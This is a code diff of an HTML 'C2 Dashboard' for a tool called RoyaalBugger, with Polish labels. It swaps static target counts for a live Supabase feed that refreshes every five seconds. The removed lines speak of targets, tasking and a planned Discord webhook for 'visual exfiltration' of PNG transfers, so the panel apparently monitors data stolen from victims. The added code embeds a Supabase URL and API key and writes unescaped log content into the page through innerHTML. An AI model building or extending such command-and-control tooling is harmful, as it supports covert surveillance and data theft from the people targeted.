@@ -4,18 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RoyaalBugger | C2 Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root { --neon: #00f2ff; --bg: #050505; --card: rgba(255, 255, 255, 0.05); }
-        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .container { width: 90%; max-width: 1000px; background: var(--card); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 90%; max-width: 1000px; background: var(--card); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); margin: 20px; }
         .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 20px; margin-bottom: 30px; }
         .logo { font-size: 24px; font-weight: 800; letter-spacing: -1px; color: var(--neon); text-transform: uppercase; }
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
         .card { background: rgba(255,255,255,0.03); border-radius: 16px; padding: 20px; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
-        .card:hover { border-color: var(--neon); transform: translateY(-5px); }
         .stat { font-size: 32px; font-weight: 700; color: var(--neon); margin: 10px 0; }
         .label { font-size: 12px; text-transform: uppercase; opacity: 0.5; letter-spacing: 1px; }
-        .bug-item { background: rgba(255, 174, 0, 0.1); border-left: 3px solid #ffae00; padding: 10px; margin: 10px 0; border-radius: 4px; font-size: 14px; }
+        .bug-item { background: rgba(255, 174, 0, 0.1); border-left: 3px solid #ffae00; padding: 15px; margin: 10px 0; border-radius: 4px; font-size: 14px; }
         .pulse { width: 10px; height: 10px; background: var(--neon); border-radius: 50%; display: inline-block; margin-right: 10px; box-shadow: 0 0 10px var(--neon); animation: blink 1.5s infinite; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
@@ -29,20 +29,64 @@
         
         <div class="grid">
             <div class="card">
-                <div class="label">Total Targets</div>
-                <div class="stat">01</div>
-                <div class="label" style="color: var(--neon);">Last connection: 2 mins ago</div>
+                <div class="label">Status bazy danych</div>
+                <div id="db-status" class="stat">ŁĄCZENIE...</div>
             </div>
             <div class="card">
-                <div class="label">Session Status</div>
-                <div class="stat" style="color: #ffae00;">PENDING</div>
-                <div class="label">Waiting for tasking...</div>
+                <div class="label">Ostatnia aktywność</div>
+                <div id="last-update" class="stat" style="font-size: 18px;">CZEKAM...</div>
             </div>
         </div>
 
-        <h3 style="margin-top: 40px; opacity: 0.8;">🚧 Unfinished Business</h3>
-        <div class="bug-item"><b>[HIGH]</b> Integrate Discord Webhook for visual exfiltration</div>
-        <div class="bug-item"><b>[MEDIUM]</b> Fix buffer reset on large PNG transfers</div>
+        <h3 style="margin-top: 40px; opacity: 0.8;">🚧 Live Logs from Supabase</h3>
+        <div id="logs-container">
+            <p style="opacity: 0.5;">Pobieranie danych...</p>
+        </div>
     </div>
+
+    <script>
+        // TWOJE DANE KONFIGURACYJNE
+        const SB_URL = 'https://xropcpuoghapfumdcyqh.supabase.co';
+        const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inhyb3BjcHVvZ2hhcGZ1bWRjcXFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3ODU1OTEsImV4cCI6MjA5MDM2MTU5MX0.WguBROzPFVR50j5zY7rWSinjk-D5Rl_EBwS_gRgL-EQ';
+        
+        const supabase = supabase.createClient(SB_URL, SB_KEY);
+
+        async function loadLogs() {
+            const { data, error } = await supabase
+                .from('logs')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            const container = document.getElementById('logs-container');
+            const statusBox = document.getElementById('db-status');
+            
+            if (error) {
+                console.error(error);
+                statusBox.innerText = "ERROR";
+                statusBox.style.color = "red";
+                return;
+            }
+
+            statusBox.innerText = "CONNECTED";
+            container.innerHTML = ''; // Czyścimy stare wpisy
+
+            if (data.length === 0) {
+                container.innerHTML = '<p style="opacity: 0.5;">Baza jest pusta. Czekam na pierwszego buga...</p>';
+            }
+
+            data.forEach(log => {
+                const div = document.createElement('div');
+                div.className = 'bug-item';
+                div.innerHTML = `<b>[${log.type.toUpperCase()}]</b> ${log.title}: ${log.content}`;
+                container.appendChild(div);
+            });
+            
+            document.getElementById('last-update').innerText = new Date().toLocaleTimeString();
+        }
+
+        // Odświeżaj co 5 sekund
+        setInterval(loadLogs, 5000);
+        loadLogs();
+    </script>
 </body>
 </html>
